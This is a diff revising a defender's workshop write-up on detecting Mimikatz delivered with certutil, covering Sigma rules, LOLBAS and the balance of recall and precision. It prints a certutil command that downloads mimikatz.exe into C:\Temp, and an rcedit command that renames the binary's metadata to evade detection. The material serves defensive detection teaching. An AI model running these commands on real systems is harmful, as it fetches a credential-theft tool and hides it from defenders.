@@ -2,12 +2,11 @@
 In this section, we'll review opportunities in the workshop and approaches in general to improve the effectiveness of our detection apparatus. 
 
 ## What is under attacker control
-The threat actor chose to use LOLBIN as part of their tooling. The TTPs vary in terms of complexity (additional stealth) and associated detection opportunities (behavior vs signature).
+The threat actor chose to use LOLBIN as part of their tooling. Rules triggered by elements under attacker control are likely to have a shorter lifetime than those based on behaviors, we need to know where we are on the Pyramid of Pain. The TTPs vary in terms of complexity (resulting in greater stealth) and associated detection opportunities ( identify a behavior rather than a signature such as filename or checksum). Let's dissect what was ran to emulates some of the threat actor activities. 
 ```
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
 ```
 ## What did we actually look for
-Rules triggered by elements under attacker control are likely to have a shorter lifetime than those based on behaviors, we need to know where we are on the Pyramid of Pain. 
 
 ### Mimikatz 
 | # | Search | ATT&CK Techniques | Notes | Dependencies |
@@ -24,7 +23,7 @@ Rules triggered by elements under attacker control are likely to have a shorter 
 | 13 | [proc_creation_win_certutil_download.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download.yml#L2) | [T1027](https://attack.mitre.org/techniques/T1027)  |two caracteristics under attacker control: the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data (very selective), commandline arguments looking for HTTP specifically (not SMB) and a specific verb ('urlcache ' or 'verifyctl '). | CLI args logging in 4688 | 
 
 ### Why LOLBAS are so challenging
-Exploit developers think in terms of "primitives" e.g. [the write what where CWE](https://cwe.mitre.org/data/definitions/123.html) . In many environments, the use of certutil.exe is supposed to be rare. It is a so-called LOLBIN - Living Off the Land Binary, part of the bigger [LOLBAS (Applications and Scripts) family](https://lolbas-project.github.io/) and [GTFOBINS for linux](https://gtfobins.github.io/). Certutil's value lies in the fact that is signed by Microsoft and already installed. This offers a ["feature" or "capability"](https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md#criteria) that the authors will not need to develop and embed in their toolkit to achieve their objectives. Detection opportunities for LOLBAS are multiple, and can yield some false positives as well as strong signals when the environment is known, since the binaries are most of the time used legitimately. 
+In many environments, the use of certutil.exe is supposed to be rare. It is a so-called LOLBIN - Living Off the Land Binary, part of the bigger [LOLBAS (Applications and Scripts) family](https://lolbas-project.github.io/) and [GTFOBINS for linux](https://gtfobins.github.io/). Certutil's value lies in the fact that is signed by Microsoft and already installed. Exploit developers often think in terms of "primitives" e.g. [the write what where CWE](https://cwe.mitre.org/data/definitions/123.html). These primitives can be considered a ["feature" or "capability"](https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md#criteria) that the authors will not need to develop and embed in their toolkit to achieve their objectives. Detection opportunities for LOLBAS are multiple, and can yield some false positives as well as strong signals when the environment is known, since the binaries are most of the time used legitimately. 
 
 # What can we do about it?
 Three main approaches can help to refine the detection's performance:
@@ -34,12 +33,12 @@ Three main approaches can help to refine the detection's performance:
 
 However, just because you could doesn't mean you should. This incurrs additional effort and you should apply this approach strategically for high value detection use cases. In some cases, a complementary deception strategy focused around relevant TTPs will be the cheapest way forward.
 
-In the workshop, we have encountered false negatives as specific detection rules (3, 21, 23) were not triggered by the operator. This means our _recall_ was insufficient overall. The rules were too precise. However, a lot of events were collected and match a simple string. We should consider many broader (more _recall_), potentially overlapping detections, acting as failover for rules which are too specific or _precise_. 
+In the workshop, we have encountered false negatives as some detection rules (3, 21, 23) were not triggered by the operator. This means our _recall_ was insufficient overall. The rules were too precise. However, a lot of events were collected and hold additional, untapped signals. We should consider many broader (more _recall_), potentially overlapping detections, acting as failover for rules which are too specific or _precise_. 
 
 ## How do we get started
 ### Good old strings
 Looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichments, rather than a final product. 
-In Splunk, search for the following strings
+In your Splunk instance, search for the following strings
 - "m.exe"
 - "delpy"
 - "mimikatz"
@@ -48,7 +47,7 @@ Recompiling or reproducing a subset of features of Mimikatz is notoriously suffi
 
 ``` C:\Temp\rcedit.exe C:\Temp\m.exe --set-version-string OriginalFileName "miminomore.exe" --set-version-string FileDescription "You'll never catch me" --set-version-string ProductName "miminomore"```
 
-Luckily, any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry, in memory or in the Windows registry in memory. Detections of behavior are unfortunately less often found in native logs, but EDRs performing hooking of select system APIs or consume native providers (ETW). We thus need to look at anomalies in large amounts of data.
+So strings definitely can be under attacker control. One could imagine replacing this miminomore.exe with intunesync.exe or svchost.exe to blend in even more. Luckily, any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry, in memory or in the Windows registry in memory. Detections of behavior are unfortunately less often found in native logs, but EDRs performing hooking of select system APIs or consume native providers (ETW). We thus need to look at anomalies in large amounts of data.
 
 ### Looking at anomalies (i.e. baselining behaviors at scale)
 
